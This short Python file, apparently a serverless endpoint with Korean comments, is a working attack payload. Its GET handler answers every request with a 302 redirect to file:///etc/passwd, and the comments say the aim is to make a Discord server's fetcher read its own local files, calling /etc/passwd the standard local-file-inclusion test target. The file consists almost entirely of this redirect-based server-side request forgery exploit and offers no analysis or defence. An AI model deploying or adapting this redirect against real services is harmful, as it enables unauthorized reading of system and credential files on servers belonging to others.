# /api/main.py
from http.server import BaseHTTPRequestHandler

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # 1. 공격 목표: 디스코드 서버의 로컬 파일 경로
        #    file:// 스킴을 사용하여 파일 시스템에 접근하도록 지시한다.
        #    '/etc/passwd'는 가장 대표적인 LFI 테스트용 파일이다.
        lfi_target = "file:///etc/passwd"

        # 2. 302 리디렉션 응답 전송
        self.send_response(302)
        self.send_header('Location', lfi_target)
        self.end_headers()
        return
